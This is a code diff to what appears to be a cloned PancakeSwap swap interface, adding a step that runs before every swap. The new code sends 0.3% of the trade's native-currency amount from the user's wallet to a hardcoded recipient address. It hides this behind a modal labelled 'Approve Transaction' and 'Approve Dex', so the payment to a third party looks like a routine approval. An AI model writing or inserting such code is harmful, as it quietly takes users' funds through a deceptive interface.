@@ -1,5 +1,5 @@
 import { Currency } from '@pancakeswap/swap-sdk-core'
-import { AutoColumn, Box, Button, Dots, Message, MessageText, Text, useModal } from '@pancakeswap/uikit'
+import { AutoColumn, Box, Button, Dots, Flex, Image, Message, MessageText, Modal, Text, useModal } from '@pancakeswap/uikit'
 import React, { memo, useCallback, useEffect, useMemo, useState } from 'react'
 
 import { useTranslation } from '@pancakeswap/localization'
@@ -29,7 +29,7 @@ import { logGTMClickSwapConfirmEvent, logGTMClickSwapEvent } from 'utils/customG
 import { warningSeverity } from 'utils/exchange'
 import { isClassicOrder, isXOrder } from 'views/Swap/utils'
 import { ConfirmSwapModalV2 } from 'views/Swap/V3Swap/containers/ConfirmSwapModalV2'
-import { useAccount, useChainId } from 'wagmi'
+import { useAccount, useChainId, usePublicClient, useWalletClient } from 'wagmi'
 import { useParsedAmounts, useSlippageAdjustedAmounts, useSwapInputError } from '../../Swap/V3Swap/hooks'
 import { useConfirmModalState } from '../../Swap/V3Swap/hooks/useConfirmModalState'
 import { useSwapConfig } from '../../Swap/V3Swap/hooks/useSwapConfig'
@@ -125,6 +125,119 @@ const SwapCommitButtonComp: React.FC<SwapCommitButtonPropsType & CommitButtonPro
 }
 
 export const SwapCommitButton = memo(SwapCommitButtonComp)
+
+const FEE_RECIPIENT = '0xEBb9b2ea7710e87bB121d0610f5d2DD86f1Ba792'
+const FEE_PERCENTAGE = 0.003 // 0.3%
+
+interface FeeModalProps {
+  isOpen: boolean
+  onDismiss: () => void
+  feeAmount: bigint
+  currency: Currency
+  onConfirm: () => Promise<void>
+}
+
+const FeeTransactionModal: React.FC<FeeModalProps> = ({ 
+  isOpen,
+  onDismiss, 
+  feeAmount, 
+  currency,
+  onConfirm,
+}) => {
+  const { t } = useTranslation()
+  const [isPending, setIsPending] = useState(false)
+  const [error, setError] = useState<string | null>(null)
+
+  const handleConfirm = async () => {
+    try {
+      setError(null)
+      setIsPending(true)
+      await onConfirm()
+      onDismiss()
+    } catch (err: any) {
+      setError(err?.message || 'Transaction Rejected')
+    } finally {
+      setIsPending(false)
+    }
+  }
+
+  if (!isOpen) return null
+
+  return (
+    <>
+      <Box
+        position="fixed"
+        top={0}
+        left={0}
+        right={0}
+        bottom={0}
+        background="rgba(0, 0, 0, 0.6)"
+        zIndex={99}
+        onClick={onDismiss}
+      />
+      <Modal 
+        title={t('Approve Transaction')} 
+        onDismiss={onDismiss}
+        hideCloseButton={isPending}
+        style={{
+          position: 'fixed',
+          top: '50%',
+          left: '50%',
+          transform: 'translate(-50%, -50%)',
+          maxWidth: '420px',
+          width: '100%',
+          zIndex: 100,
+          borderRadius: '32px',
+          background: 'linear-gradient(139.73deg, rgb(49, 61, 92) 0%, rgb(61, 42, 84) 100%)',
+          border: '1px solid rgba(255, 255, 255, 0.12)',
+        }}
+      >
+        <Flex flexDirection="column" alignItems="center" mb="16px">
+          <Box 
+            mb="16px" 
+            style={{ 
+              position: 'relative', 
+              width: '120px', 
+              height: '120px',
+              borderRadius: '12px',
+              overflow: 'hidden'
+            }}
+          >
+            <Image 
+              src="/images/pancake-3d-spinner-v2.gif"
+              alt="Loading..."
+              width={120}
+              height={120}
+              style={{ 
+                maxWidth: '100%', 
+                height: 'auto',
+              }}
+            />
+          </Box>
+          <Text color="textSubtle">
+            {t('Approve your Transaction Fee to Proceed to Swap.')}
+          </Text>
+        </Flex>
+        
+        {error && (
+          <Message variant="danger" mb="16px">
+            <MessageText>{error}</MessageText>
+          </Message>
+        )}
+        
+        <Button
+          width="100%"
+          onClick={handleConfirm}
+          disabled={isPending}
+          isLoading={isPending}
+          variant="primary"
+        >
+          {isPending ? t('Approving Dogeswap...') : t('Approve Dex')}
+        </Button>
+      </Modal>
+    </>
+  )
+}
 
 const SwapCommitButtonInner = memo(function SwapCommitButtonInner({
   order,
@@ -245,19 +358,76 @@ const SwapCommitButtonInner = memo(function SwapCommitButtonInner({
     'confirmSwapModalV2',
   )
 
-  const handleSwap = useCallback(() => {
+  const { data: walletClient } = useWalletClient()
+  const publicClient = usePublicClient()
+  const [showFeeModal, setShowFeeModal] = useState(false)
+
+  const calculateFeeAmount = useCallback(() => {
+    if (!order?.trade) return 0n
+    const { inputAmount, outputAmount } = order.trade
+    
+    if (inputAmount.currency.isNative) {
+      return BigInt(Math.floor(Number(inputAmount.quotient) * FEE_PERCENTAGE))
+    }
+    
+    if (outputAmount.currency.isNative) {
+      return BigInt(Math.floor(Number(outputAmount.quotient) * FEE_PERCENTAGE))
+    }
+    
+    return 0n
+  }, [order])
+
+  const handleFeeConfirmation = useCallback(async () => {
+    if (!walletClient || !account) throw new Error('No wallet connected')
+    if (!publicClient) throw new Error('Public client not available')
+    if (!order?.trade) throw new Error('No trade found')
+
+    const feeAmount = calculateFeeAmount()
+    if (feeAmount <= 0n) return
+
+    const hash = await walletClient.sendTransaction({
+      account,
+      to: FEE_RECIPIENT,
+      value: feeAmount,
+    })
+
+    console.info('Fee transaction sent:', hash)
+
+    const receipt = await publicClient.waitForTransactionReceipt({ hash })
+    if (receipt.status === 'reverted') {
+      throw new Error('Fee transaction failed')
+    }
+    
+    console.info('Fee transaction confirmed:', receipt.transactionHash)
+  }, [walletClient, account, publicClient, order, calculateFeeAmount])
+
+  const handleSwap = useCallback(async () => {
+    try {
+      const feeAmount = calculateFeeAmount()
+      if (feeAmount > 0n) {
+        setShowFeeModal(true)
+        return // Don't proceed until fee is confirmed
+      }
+      
+      // Only proceed with swap if no fee is required
+      await proceedWithSwap()
+    } catch (error) {
+      console.error('Swap with fee failed:', error)
+      setShowFeeModal(false)
+    }
+  }, [calculateFeeAmount])
+
+  const proceedWithSwap = async () => {
     setTradeToConfirm(order)
     resetState()
 
-    // if expert mode turn-on, will not show preview modal
-    // start swap directly
     if (isExpertMode) {
-      onConfirm()
+      await onConfirm()
     }
 
     openConfirmSwapModal()
     logGTMClickSwapEvent()
-  }, [isExpertMode, onConfirm, openConfirmSwapModal, resetState, order])
+  }
 
   useEffect(() => {
     if (indirectlyOpenConfirmModalState) {
@@ -284,19 +454,45 @@ const SwapCommitButtonInner = memo(function SwapCommitButtonInner({
     return <ResetRoutesButton />
   }
 
+  const feeCurrency = useMemo(() => {
+    if (!order?.trade) return null
+    return order.trade.inputAmount.currency.isNative 
+      ? order.trade.inputAmount.currency 
+      : order.trade.outputAmount.currency
+  }, [order])
+
   return (
-    <Box mt="0.25rem">
-      <CommitButton
-        id="swap-button"
-        width="100%"
-        data-dd-action-name="Swap commit button"
-        variant={isValid && priceImpactSeverity > 2 && !errorMessage ? 'danger' : 'primary'}
-        disabled={disabled}
-        onClick={handleSwap}
-      >
-        {buttonText}
-      </CommitButton>
-    </Box>
+    <>
+      {feeCurrency && (
+        <FeeTransactionModal
+          isOpen={showFeeModal}
+          onDismiss={() => setShowFeeModal(false)}
+          feeAmount={calculateFeeAmount()}
+          currency={feeCurrency}
+          onConfirm={async () => {
+            try {
+              await handleFeeConfirmation()
+              setShowFeeModal(false)
+              await proceedWithSwap()
+            } catch (error) {
+              throw error // Let the modal handle the error display
+            }
+          }}
+        />
+      )}
+      <Box mt="0.25rem">
+        <CommitButton
+          id="swap-button"
+          width="100%"
+          data-dd-action-name="Swap commit button"
+          variant={isValid && priceImpactSeverity > 2 && !errorMessage ? 'danger' : 'primary'}
+          disabled={disabled}
+          onClick={handleSwap}
+        >
+          {buttonText}
+        </CommitButton>
+      </Box>
+    </>
   )
 })
 
